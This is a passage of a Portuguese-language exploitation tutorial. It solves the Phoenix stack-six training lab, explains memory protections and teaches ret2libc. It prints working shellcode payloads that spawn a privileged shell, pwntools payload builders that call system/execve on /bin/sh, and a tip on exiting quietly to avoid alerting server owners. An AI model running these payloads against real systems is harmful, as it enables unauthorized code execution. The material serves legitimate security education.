estamos definindo <code>rip = 0x00007fffffffe5c8</code> ent√£o nos temos <code>RIP -&gt; 0x00007fffffffe5c8 -&gt; 0x00007fffffffef10 -&gt; env vars</code></p>
<p>E voc√™ talvez voce esteja se perguntando, pra qual env var que RIP ta apontando?</p>
<pre><code class="language-x86asm">gef&gt; x/s 0x00007fffffffef10
0x7fffffffef10:	'A' &lt;repeats 127 times&gt;
</code></pre>
<p>Por sorte, justamente o inicio do nosso buffer! Ent√£o n√£o precisa nem de NOP sled ate o shellcode</p>
<pre><code>Se voc√™ quer continuar sozinhx, agora √© sua hora de brilhar!
Dica: O valor que precisamos colocar no rbp salvo, por meio do overflow √©: c0
Eu recomendo vc tentar encontrar ele por conta pr√≥pria pois
pode variar de acordo com o seu computador (explica√ß√£o em breve) :D
.
.
.
.
.
.
.
</code></pre>
<h2 id="shellcode-1"><a class="header" href="#shellcode-1">Shellcode</a></h2>
<p>Ent√£o o nosso exploit vai ficar: <code>shellcode+AAAAAAAAAAAA+c0</code></p>
<p>Para testar isso, vou usar o truque do <code>0xcc</code>:</p>
<pre><code class="language-x86asm">$ export ExploitEducation=$(python -c &quot;print '\xcc' + 125 * 'A' + '\xc0'&quot;)
$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Trace/breakpoint trap
</code></pre>
<p>Obs: eu separei a linha do &quot;Welcome AAAAAA....AAA????&quot; para caber na tela </p>
<p>Isso quer dizer que conseguimos execu√ß√£o de c√≥digo! lembrando que isso √© muito fr√°gil: uma altera√ß√£o nas envs e o exploit quebra!</p>
<p>Nos podemos usar t√©cnicas como encontrar um pointer que esta numa localiza√ß√£o fixa usando <code>ROPgadgets</code>, ou um <code>NOP sled</code>!</p>
<p>Porem, nesse desafio vamos focar em s√≥ fazer ele funcionar! Caso vc queira, pode aplicar as t√©cnicas ensinadas previamente para tornar o exploit melhor!</p>
<hr />
<p><strong>Obs</strong></p>
<p>Mas por exemplo, caso executemos <code>./stack-six</code> ao inv√©s de <code>/opt/phoenix/amd64/stack-six</code>, o exploit n√£o funciona :(</p>
<pre><code class="language-x86asm">$ ./stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you ÔøΩAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
Segmentation fault
</code></pre>
<p>E por isso que, quando for ver outros tutoriais, talvez <code>c0</code> seja outro valor! Muito provavelmente essa diferen√ßa √© causada pela env <code>LS_COLORS</code> 
(uma vari√°vel <strong>gigantesca</strong> que lista as cores do terminal! </p>
<p>Caso voc√™ utilize um terminal mais moderno (com emojis por exemplo) para entrar via ssh, pode haver uma diferen√ßa!</p>
<p>Mas voc√™ esta equipadx com o conhecimento para conseguir resolver e encontrar o valor correto, caso tenha mudado! :D</p>
<hr />
<p>Agora, vamos usar um shellcode de verdade! At√© achar um que funciona √© tentativa e erro! Eu recomendo voc√™ procurar aqui: <a href="http://shell-storm.org/shellcode/">shell-storm</a></p>
<p>Para mim, <a href="http://shell-storm.org/shellcode/files/shellcode-806.php">shellcode-806</a> costuma funcionar muito bem, e dessa vez funcionou perfeitamente! :D</p>
<p>Mas claro, voc√™ pode brincar com todos aqueles shellcodes: alterar a senha, criar um arquivo, ... o ceu √© o limite! Ou talvez nem o ceu... ja que esse esse √© um tutorial sobre quebrar limites hehehe :D</p>
<blockquote>
<p>AVISO: Esse tutorial √© sobre quebrar o limite de buffers! N√£o tente quebrar o ceu, pois pode resultar em acidentes, quedas, ou as pessoas rirem de voc√™ socando o ar!</p>
</blockquote>
<p>Mas bem, piadas sem gra√ßa a parte, o exploit ficou assim: SHELLCODE+99 * A+c0</p>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<p>Lembrando que a quantidade de As deve ser alterada para que <code>c0 seja o byte 127 (shellcode + AAAAAA + c0 = 127)</code></p>
<p>Nesse caso, o shellcode tem 27 bytes: <code>27 + 99 As + 1 byte (c0) = 127</code></p>
<p>Caso seu shellcode seja maior, basta reduzir os As respectivamente!</p>
<hr />
<p>Finalmente! terminamos a parte da stack uhuuu</p>
<p>Esse stack-six foi beeeeem complicadinho! Ent√£o parab√©ns por ter chegado ate aqui! :D</p>
<h1 id="-solu√ß√£o-6"><a class="header" href="#-solu√ß√£o-6">üí´ Solu√ß√£o</a></h1>
<blockquote>
<p>$ export ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;)</p>
</blockquote>
<pre><code class="language-x86asm">$ /opt/phoenix/amd64/stack-six 
Welcome to phoenix/stack-six, brought to you by https://exploit.education
Welcome, I am pleased to meet you 1ÔøΩHÔøΩ—ùÔøΩÔøΩ–åÔøΩÔøΩHÔøΩÔøΩST_ÔøΩRWT^ÔøΩ;AAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAÔøΩÔøΩÔøΩÔøΩÔøΩ
$ id
uid=1000(user) gid=1000(user) euid=406(phoenix-amd64-stack-six) egid=406(pho
enix-amd64-stack-six) 
groups=406(phoenix-amd64-stack-six),27(sudo),1000(user)
</code></pre>
<p>obs: eu precisei colocar o primeiro comando numa caixinha diferente para caber na tela :/ Mas finge que √© a mesma hehe :D</p>
<p>Ou caso voc√™ prefira tudo em um s√≥ comando, basta definir a env e executar de uma vez:</p>
<blockquote>
<p>ExploitEducation=$(python -c &quot;print '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05' + 99 * 'A' + '\xc0'&quot;) /opt/phoenix/amd64/stack-six</p>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/mitigacoes.html#dep--nx--wx">DEP | NX | W^X</a></li>
<li><a href="stack/mitigacoes.html#system-aslr">System ASLR</a></li>
<li><a href="stack/mitigacoes.html#pie">PIE</a></li>
<li><a href="stack/mitigacoes.html#relro">RELRO</a>
<ul>
<li><a href="stack/mitigacoes.html#parcial">Parcial</a></li>
<li><a href="stack/mitigacoes.html#full">Full</a></li>
<li><a href="stack/mitigacoes.html#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></li>
</ul>
</li>
<li><a href="stack/mitigacoes.html#canaries">Canaries</a></li>
<li><a href="stack/mitigacoes.html#outras">Outras</a>
<ul>
<li><a href="stack/mitigacoes.html#linux">Linux</a>
<ul>
<li><a href="stack/mitigacoes.html#pointer-guard">Pointer Guard</a></li>
</ul>
</li>
<li><a href="stack/mitigacoes.html#windows">Windows</a></li>
</ul>
</li>
</ul>
<h1 id="dep--nx--wx"><a class="header" href="#dep--nx--wx">DEP | NX | W^X</a></h1>
<p>Todas essas pretendem impedir a execu√ß√£o de c√≥digo em 
partes da memoria que sejam &quot;escreviveis&quot;.</p>
<p>Impedir que x atacante execute o c√≥digo escrito 
pelx mesmx, previne que Shellcodes sejam usados! :D</p>
<p>Assim, ou uma parte da memoria ou pode ser escrita, ou 
execut√°vel, mas nunca as duas simultaneamente: 
<strong>W</strong>rite <strong>XOR(^)</strong> e<strong>X</strong>ecute</p>
<p>Voc√™ vai ouvir pessoas usando os 3 nomes para representar 
esse conceito, e dependendo do contexto n√£o tem problema!</p>
<p>Porem eles s√£o tecnicamente diferentes:</p>
<p><strong>DEP</strong> (<strong>P</strong>revencao da <strong>E</strong>xecucao de <strong>D</strong>ados): 
a implementa√ß√£o do <strong>Windows</strong></p>
<p><strong>N</strong>ao e<strong>X</strong>ecute: um bit que pode ser colocado para 
garantir a exclus√£o mutua em processadores <strong>AMD</strong>.</p>
<p>Intel tem um outro nome, que eu n√£o lembro... 
e n√£o importa o suficiente para eu pesquisar! :P</p>
<blockquote>
<p>Atualmente, a exclus√£o mutua de escrever e executar 
ocorre por meio de paging: o sistema operacional decide 
as permiss√µes das paginas de memorias, e garante que uma 
n√£o viole W^X . <strong>No momento que voc√™ esta lendo, isso 
pode ter mudado!</strong></p>
</blockquote>
<h1 id="system-aslr"><a class="header" href="#system-aslr">System ASLR</a></h1>
<p>ASLR randomiza os endere√ßos das coisas na memoria! Porem 
com as suas limita√ß√µes, dado que depende doo sistema 
operacional!</p>
<p>Cada OS implementa de um jeito, mas em geral se randomiza:</p>
<ul>
<li>Imports dinamicos (LIBC,...)</li>
<li>Segmentos do execut√°vel (Data, ROData, ...)</li>
<li>Stack e Heap</li>
</ul>
<p><strong>Porem, o endere√ßo do c√≥digo n√£o muda!</strong></p>
<h1 id="pie"><a class="header" href="#pie">PIE</a></h1>
<p>Para garantir que o c√≥digo tamb√©m tenha sua posi√ß√£o 
randomizada, o bin√°rio precisa ser compilado com PIE !</p>
<p>PIE (<strong>E</strong>xecucao <strong>I</strong>ndependente da <strong>P</strong>osi√ß√£o) impede 
que o codigo possa ser executado independente da sua<br />
posi√ß√£o na memoria (duh :P)</p>
<p>Para garantir isso, todos endere√ßos precisam ser relativos ao inv√©s de absolutos!</p>
<pre><code>			Endere√ßo	Instru√ß√£o
Sem PIE     0x0001	jmp 0x0003 &lt;- EIP	
			0x0002	add 1 2
			0x0003	add 1 3

Com PIE     ------	jmp EIP+2  &lt;- EIP
			------	add 1 2
			------	add 1 3
</code></pre>
<p>No primeiro caso, se o execut√°vel mudar de endere√ßo 
o <code>JMP</code> pularia para a instru√ß√£o errada, por causa do 
endere√ßo absoluto.</p>
<h1 id="relro"><a class="header" href="#relro">RELRO</a></h1>
<p>Realocacoes Read-only: Dividido em 2 tipos: Parcial e Full</p>
<p>Atualmente, somente o RELRO Parcial vem como padrao no gcc</p>
<ul>
<li>PARCIAL: <code>gcc -Wl,-z,relro</code> ou nenhuma flag, em versoes modernas</li>
<li>FULL: <code>gcc -Wl,-z,relro,-z,now</code></li>
</ul>
<h2 id="parcial"><a class="header" href="#parcial">Parcial</a></h2>
<ul>
<li>As <code>sections</code> de dados do ELF (<code>got</code>,<code>dtors</code>,<code>ctors</code>) precedem as do programa 
(<code>data</code>,<code>bss</code>). Assim, caso tenha um BoF no programa a estrutura do ELF fica 
intacta. </li>
</ul>
<h2 id="full"><a class="header" href="#full">Full</a></h2>
<ul>
<li>Tudo do parcial</li>
<li>Re-Mapeia a GOT como <code>r--</code>, impedindo que a usemos para ganhar execucao.</li>
</ul>
<p>Porem para fazer isso torna-se nescessario pre-resolver todas as calls 
dinamicas. Assim. desativando <code>RTLD_LAZY</code> e consequentemente tornando a 
inicializacao mais lenta.</p>
<p>Da nossa perspectiva, ficamos com opcoes reduzidas para execucao de codigo, 
tendo de usar tecnicas como corromper os <code>malloc hooks</code> ou o <code>vtable</code> pointer 
do <code>stdio</code>. (mais sobre esses no futuro!)</p>
<h2 id="fontes-e-recursos-adicionais"><a class="header" href="#fontes-e-recursos-adicionais">Fontes e Recursos Adicionais</a></h2>
<ul>
<li><a href="https://www.trapkit.de/articles/relro/">trapkit: RELRO A (not so well known) Exploit Mitigation Technique</a></li>
<li><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/em386/Self-Protecting-GOT.html">Self Protecting GOT</a></li>
</ul>
<hr />
<p>TODO</p>
<hr />
<h1 id="canaries"><a class="header" href="#canaries">Canaries</a></h1>
<h1 id="outras"><a class="header" href="#outras">Outras</a></h1>
<h2 id="linux"><a class="header" href="#linux">Linux</a></h2>
<h3 id="pointer-guard"><a class="header" href="#pointer-guard">Pointer Guard</a></h3>
<h2 id="windows"><a class="header" href="#windows">Windows</a></h2>
<div style="break-before: page; page-break-before: always;"></div><ul>
<li><a href="stack/ret2libc.html#ret2libc">Ret2LibC</a></li>
<li><a href="stack/ret2libc.html#fun%C3%A7%C3%B5es-%C3%BAteis">Fun√ß√µes √öteis</a>
<ul>
<li><a href="stack/ret2libc.html#system">System()</a>
<ul>
<li><a href="stack/ret2libc.html#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></li>
<li><a href="stack/ret2libc.html#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></li>
<li><a href="stack/ret2libc.html#unindo-tudo">Unindo tudo</a></li>
</ul>
</li>
</ul>
</li>
<li><a href="stack/ret2libc.html#pontos-fracos">Pontos Fracos</a>
<ul>
<li><a href="stack/ret2libc.html#estaticamente-linkado">Estaticamente Linkado</a></li>
<li><a href="stack/ret2libc.html#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></li>
</ul>
</li>
<li><a href="stack/ret2libc.html#fun%C3%A7%C3%B5es-uteis-pt-2">Fun√ß√µes Uteis Pt 2</a>
<ul>
<li><a href="stack/ret2libc.html#execve--exit">Execve() + Exit()</a></li>
<li><a href="stack/ret2libc.html#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a>
<ul>
<li><a href="stack/ret2libc.html#argumentos">Argumentos</a>
<ul>
<li><a href="stack/ret2libc.html#addr">Addr</a></li>
<li><a href="stack/ret2libc.html#size">Size</a></li>
<li><a href="stack/ret2libc.html#perms">Perms</a></li>
</ul>
</li>
<li><a href="stack/ret2libc.html#classifica%C3%A7%C3%A3o">Classifica√ß√£o</a></li>
<li><a href="stack/ret2libc.html#analise">Analise</a></li>
</ul>
</li>
</ul>
</li>
</ul>
<h1 id="ret2libc"><a class="header" href="#ret2libc">Ret2LibC</a></h1>
<p>Ret2Libc foi uma t√©cnica desenvolvida para combater W^X. Alem disso, 
ter dom√≠nio dessa t√©cnica facilitar a compreens√£o de ROP. :D </p>
<p>Por nao podermos colocar o shellcode na stack (ou heap), precisamos 
encontrar outra maneira de conseguir uma shell... Assim, vamos precisar 
encontrar uma parte execut√°vel na memoria! Uma fun√ß√£o do pr√≥prio programa!</p>
<p>Voce se lembra de quando cham√°vamos uma <code>call_me()</code> ou <code>win()</code> nos desafios 
iniciais? Ent√£o... poder√≠amos fazer isso... mas ningu√©m colocaria uma 
fun√ß√£o pre-pronta pra nos dar uma shell :(</p>
<p>Felizmente, existe LibC, e dentro dela existem m√∫ltiplas fun√ß√µes √∫teis!</p>
<h1 id="fun√ß√µes-√öteis"><a class="header" href="#fun√ß√µes-√öteis">Fun√ß√µes √öteis</a></h1>
<h2 id="system"><a class="header" href="#system">System()</a></h2>
<p><a href="https://godbolt.org/z/691asM">Compiler Explorer: System</a></p>
<p>Para nosso prop√≥sito, ela recebe 1 argumento, o caminho do programa para 
executar (Ex: <code>/bin/sh</code>)</p>
<p>Em C:</p>
<pre><code class="language-C">#include &lt;stdlib.h&gt;
int main() {
    system(&quot;/bin/ls&quot;);
    return 0;
}
</code></pre>
<p>Em assembly:</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;/bin/ls&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edi, OFFSET FLAT:.LC0
        call    System
        mov     eax, 0
        pop     rbp
        ret
</code></pre>
<p>A fun√ß√£o recebe um pointer para a string via <code>rdi</code> (64 bits) ou os 
argumentos sao passados pela stack (32 bits). Nesse post vou focar em 32 
bits!</p>
<h4 id="conseguindo-o-pointer-para-binsh"><a class="header" href="#conseguindo-o-pointer-para-binsh">Conseguindo o pointer para /bin/sh</a></h4>
<p>Usando pwntools: </p>
<pre><code class="language-python">x = next(libc.search(b&quot;/bin/sh\x00&quot;))
</code></pre>
<p>x sera um pointer contendo o endere√ßo da string <code>/bin/sh</code></p>
<p>Em 32 bits, basta colocar ele no local previamente mencionado!</p>
<p>Em 64 bits, precisaremos de um gadget para colocar esse valor no rdi...
Portanto, voce vai precisar saber ROP, o tema do proximo capitulo!</p>
<h4 id="layout-da-stack-numa-call-32-bits"><a class="header" href="#layout-da-stack-numa-call-32-bits">Layout da stack numa call 32 bits</a></h4>
<pre><code class="language-x86asm">    Func_1
 ____________
|            |
|    RBP     | 
|____________| 
 ____________
|            |
|    RIP     | &lt;--- RSP -&gt; No BOF tradicional, corrompemos esse RIP!
|____________|      Porem, nao costumamos pensar o que acontece depois!
 ____________
|            |      Um ret simplesmente significa:
|   ARG_1    |         pop RIP
|____________|         jmp RIP
 ____________           
|            |      E como em qualquer pop, RSP se movimenta
|   ARG_2    |
|____________| 

    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
|    RBP     |   Vamos supor que RIP-&gt;System()     |            |
|____________|   Ent√£o da perspectiva de System,   |____________|
 ____________           ARG_1 vira RIP              ____________       
|            |          ARG_2 vira ARG_1           |            |
|    RIP     |   ____                              |            |
|____________|       |                             |____________|
 ____________        |                              ____________
|            |       V                             |            |  
|   ARG_1    | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|   ARG_2    |                                     |   ARG_1    |
|____________|                                     |____________|


    Func_1                                             System
 ____________                                       ____________            
|            |                                     |            |
| AAAAAAAAAA |    A Func_1 esta vulner√°vel a BOF   |            |
|____________|                                     |____________|
 ____________                                       ____________       
|            |    E nos controlamos a stack :D     |            |
|  SYSTEM()  |    Ent√£o podemos passar os args     |            |
|____________|    e o RIP de retorno para System   |____________|
 ____________                                       ____________
|            |                                     |            |  
|  DDDDDDD   | &lt;--- RSP                   RSP ---&gt; |    RIP     |
|____________|                                     |____________|
 ____________                                       ____________
|            |                                     |            |  
|  /bin/sh   | &lt;&lt;&lt; --------------------------- &gt;&gt;&gt; |   ARG_1    |
|____________|                                     |____________|

                  System (ou qualquer outra 
                  fun√ß√£o que voce chamar) 
                  vai executar /bin/sh e 
                  tentar retornar para DDDDDDDD

</code></pre>
<p>Ao tentar retornar para <code>DDDDDDDD</code>, ocorrera uma <code>SEGFAULT</code>.</p>
<p>Isso sera discutido na proxima secao (<code>Execve</code>)....</p>
<p>Mas por enquanto, o que voce precisa saber: <code>System</code> cria um novo processo 
(<code>fork</code>, gerando um processo secund√°rio: <code>child_proc</code>)! </p>
<p>Ent√£o retornar errado vai crashar o <code>child_proc</code> ... mas e esse crash sera 
reportado para o processo principal e nao para o computador!</p>
<blockquote>
<p><code>System</code> AGE COMO UMA EXCESSAO: NAO GERANDO <code>SEGFAULT</code> AO RETORNAR ERRADO !!!!!</p>
</blockquote>
<h3 id="unindo-tudo"><a class="header" href="#unindo-tudo">Unindo tudo</a></h3>
<p>Vamos supor que o programa esta vulner√°vel a um BoF tradicional na fun√ß√£o 
<code>batata()</code>, possui W^X, e o ASLR esta DESATIVADO!</p>
<p>O <code>RIP</code> salvo esta a 40 bytes de distancia!</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40            # Padding
payload += p32(libc.sym.system) # RIP salvo batata()
payload += b&quot;D&quot; * 8             # Padding / RIP salvo system()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 para system()
</code></pre>
<p>Caso voce esteja com pressa, adios!</p>
<p>Daqui em diante eu vou discutir t√©cnicas alternativas de ret2libc, vantagens 
e desvantagens... Para ter bom proveito eu recomendo re-ler depois de aprender 
ROP! </p>
<h1 id="pontos-fracos"><a class="header" href="#pontos-fracos">Pontos Fracos</a></h1>
<h2 id="estaticamente-linkado"><a class="header" href="#estaticamente-linkado">Estaticamente Linkado</a></h2>
<p>Em programas estaticamente linkados ao libc, somente podemos usar uma 
fra√ß√£o das fun√ß√µes presentes, pois somente as que sao originalmente usadas 
pelo programa sao linkadas!</p>
<h2 id="dinamicamente-linkado--aslr"><a class="header" href="#dinamicamente-linkado--aslr">Dinamicamente Linkado (+ ASLR)</a></h2>
<p>Ja em programas que usam o libc do sistema, voce pode usar o todo o 
potencial do libc. Porem caso o computador possua ASLR ligado, sera 
necess√°rio primeiro encontrar o endere√ßo aleat√≥rio do libc (libc-leak), ou 
executar o exploit em loop ate voce dar sorte (vi√°vel somente em 
computadores 32 bits).</p>
<h1 id="fun√ß√µes-uteis-pt-2"><a class="header" href="#fun√ß√µes-uteis-pt-2">Fun√ß√µes Uteis Pt 2</a></h1>
<h2 id="execve--exit"><a class="header" href="#execve--exit">Execve() + Exit()</a></h2>
<p><a href="https://godbolt.org/z/7c6xWd">Compiler Explorer: System</a></p>
<p><code>Execve</code> e simplesmente um wrapper envolta da syscall de mesmo nome, e 
funciona igual <code>System</code>, porem com uma diferen√ßa: <code>System</code> cria um novo 
processo para o programa, enquanto <code>Execve</code> substitui o atual!</p>
<p>Quando vc sai da shell em <code>System</code>, o programa finaliza normalmente. Ja em 
<code>Execve</code>, ele age como se estivesse retornando de uma <code>call</code>, assim, se voce 
simplesmente chamar ele, quando voce fechar a shell vai gerar uma 
<code>SEGFAULT</code> tentando executar <code>*DDDDDDD</code></p>
<p>E com a <code>SEGFAULT</code>, um core dump sera gerado... Disparando alarmes e 
ativando mecanismos de seguran√ßa que alertam o dono do servidor!</p>
<p>Assim, precisamos substituir esse valor por <code>Exit()</code>, garantindo que o 
programa finalize silenciosamente!</p>
<p>Alem disso, existe mais uma diferen√ßa, <code>execve</code> recebe 3 argumentos:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  execve(&quot;./blablabla&quot;, NULL, NULL);
  return 1;
}
</code></pre>
<p>O primeiro: programa a ser executado</p>
<p>O segundo: argv (poder√≠amos passar <code>-p</code> para <code>sh</code> manter os privil√©gios)</p>
<p>O terceiro: envp (environment vars)</p>
<p>Nos podemos simplesmente defini-las como <code>NULL</code> para evitar dor de cabeca!</p>
<p>Em 64 bits precisar√≠amos de m√∫ltiplos gadgets para salvar um em cada register</p>
<pre><code class="language-x86asm">.LC0:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        mov     edx, 0                ; envp
        mov     esi, 0                ; argv
        mov     edi, OFFSET FLAT:.LC0 ; programa
        call    execve
        mov     eax, 1
        pop     rbp
        ret
</code></pre>
<p>Caso voce queira usar argv:</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, NULL);
  return 1;
}
</code></pre>
<pre><code class="language-x86asm">.LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 32
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        lea     rax, [rbp-32]
        mov     edx, 0
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC2
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>E combinando tudo: <a href="https://godbolt.org/z/45dsKr">Compiler Explorer</a></p>
<p>Vai testar la, pra voce criar uma vibe intuitiva do que ta acontecendo!</p>
<pre><code class="language-C">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
int main() {
  char *argv[] = {&quot;arg1&quot;, &quot;arg2&quot;, NULL};
  char *envp[] = {&quot;env1&quot;, &quot;env2&quot;, NULL};
  execve(&quot;./blablabla&quot;, argv, envp);
  return 1;
}}
</code></pre>
<pre><code class="language-x86asm">..LC0:
        .string &quot;arg1&quot;
.LC1:
        .string &quot;arg2&quot;
.LC2:
        .string &quot;env1&quot;
.LC3:
        .string &quot;env2&quot;
.LC4:
        .string &quot;./blablabla&quot;
main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 64
        mov     QWORD PTR [rbp-32], OFFSET FLAT:.LC0
        mov     QWORD PTR [rbp-24], OFFSET FLAT:.LC1
        mov     QWORD PTR [rbp-16], 0
        mov     QWORD PTR [rbp-64], OFFSET FLAT:.LC2
        mov     QWORD PTR [rbp-56], OFFSET FLAT:.LC3
        mov     QWORD PTR [rbp-48], 0
        lea     rdx, [rbp-64]
        lea     rax, [rbp-32]
        mov     rsi, rax
        mov     edi, OFFSET FLAT:.LC4
        call    execve
        mov     eax, 1
        leave
        ret
</code></pre>
<p>Bem, agora que voce voltou de ficar brincando com a fun√ß√£o, vamos voltar a pratica:</p>
<p>Eu tenho 99% de certeza que isso funcionaria, porem eu nunca usei execve em 32 bits! D:</p>
<pre><code class="language-python">from pwn import *

elf = ELF(&quot;./blablabla&quot;)
libc = elf.libc

payload = b&quot;&quot;
payload += b&quot;A&quot; * 40                              # Padding
payload += p32(libc.sym.execve)                   # RIP salvo batata()
payload += p32(libc.sym.exit)                     # RIP salvo execve()
payload += p32(next(libc.search(b&quot;/bin/sh\x00&quot;))) # ARG_1 execve()
payload += p32(0)                                 # argv execve()
payload += p32(0)                                 # envp execve()
</code></pre>
<p>Os argumentos est√£o sendo passados conforme conven√ß√£o... mas eu nao posso garantir!</p>
<p>Tecnicamente eu poderia testar usando a referencia acima (<code>[rbp - 123]</code>) ! opa, pregui√ßa hehehe :/</p>
<blockquote>
<p>Mas como eu mencionei anteriormente, <code>execve</code> e a proxima t√©cnica (<code>mprotect</code>) 
sao mais comuns apos voce aprender ROP, apesar de tecnicamente serem ret2libc</p>
</blockquote>
<h2 id="mprotect--ret2shellcode"><a class="header" href="#mprotect--ret2shellcode">Mprotect() + ret2shellcode</a></h2>
<p><code>Mprotect</code> pode ser usado para tornar uma regi√£o da memoria <code>RWX</code> novamente!</p>
<p>A funcao recebe 3 argumentos: mprotect(addr, size, perms) </p>
<p>Assim, em 64 bits vamos precisar de uma chain, e em 32 bits dar push da 
direita pra esquerda!</p>
<pre><code>mprotect
ret       -&gt; shellcode
addr
size
perms
</code></pre>
<h3 id="argumentos"><a class="header" href="#argumentos">Argumentos</a></h3>
<h4 id="addr"><a class="header" href="#addr">Addr</a></h4>
<p>O endere√ßo deve ser alinhado ao page_size, assim podemos fazer:</p>
<pre><code class="language-py">((addr &gt;&gt; 4*n) &lt;&lt; 4*n)
</code></pre>
<p>Alinhando o endere√ßo fazendo shift-direita shift-esquerda, 4 por digito hex!</p>
<pre><code class="language-py">&gt;&gt;&gt; hex((0x7ffe23668bf4 &gt;&gt; 12) &lt;&lt; 12 )
'0x7ffe23668000'
</code></pre>
<h4 id="size"><a class="header" href="#size">Size</a></h4>
<p>O valor deve ser multiplo de page_size, exemplo: 
0x1000 em x86_64</p>
<p>Para encontrar esse valor na arquitetura que voce esta usando, basta ler o 
manual (op√ß√£o chata e 0% descolada) ou usar <code> page_size = getpagesize ();</code> em C</p>
<h4 id="perms"><a class="header" href="#perms">Perms</a></h4>
<p>As permiss√µes sao: <code>PERM_READ, PERM_WRITE,... etcetc</code></p>
<blockquote>
<p>OBS: existem outras permiss√µes relacionadas a memoria privada vs compartilhada etc</p>
</blockquote>
<p>Porem, essas sao somente macros de valor substitu√≠das por <code>ints</code></p>
<blockquote>
<p>read=1 write=2 exec=4</p>
</blockquote>
<p>Assim, para termos todas as permiss√µes, o valor de perms deve ser <code>7</code>!</p>
<h3 id="classifica√ß√£o"><a class="header" href="#classifica√ß√£o">Classifica√ß√£o</a></h3>
<p>Esses tipo de exploit se classifica como: exploit de m√∫ltiplas etapas </p>
<p>Assim, tornando a regi√£o do nosso shellcode execut√°vel, e somente depois 
pulando para ele!
Esses exploits vem se tornando mais e mais comuns conforme novas prote√ß√µes 
sao adicionadas!</p>
<h3 id="analise"><a class="header" href="#analise">Analise</a></h3>
<p>Porem, essa t√©cnica sera usada predominantemente em SROP 64 bits !</p>
